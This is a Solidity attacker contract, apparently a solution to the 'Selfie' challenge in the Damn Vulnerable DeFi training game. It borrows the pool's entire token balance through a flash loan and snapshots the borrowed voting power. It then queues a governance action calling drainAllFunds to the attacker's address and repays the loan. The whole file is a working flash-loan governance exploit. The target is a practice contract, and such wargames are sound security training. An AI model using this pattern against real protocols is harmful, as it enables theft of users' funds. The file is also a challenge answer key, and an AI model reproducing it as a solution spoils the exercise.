pragma solidity ^0.8.0;

import "./SelfiePool.sol";

contract SelfiePoolAttacker {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    address public attackerEOA;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;

    constructor(address _selfiePool, address _simpleGovernance, address _token, address _attaker) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        token = DamnValuableTokenSnapshot(_token);
        attackerEOA = _attaker;
        actionId = 0;
    }

    function receiveTokens(address, uint256 amount) public {
        token.snapshot();
        bytes memory drainAllFundsPayload = abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
        actionId = simpleGovernance.queueAction(address(selfiePool),drainAllFundsPayload,0);

        token.transfer(address(selfiePool), amount);
    } 

    function attack() external {
        uint256 flashLoanBalance = token.balanceOf(address(selfiePool));
        selfiePool.flashLoan(flashLoanBalance);

    }

    function getActionId() public view returns (uint256) {
        return actionId;
    }
}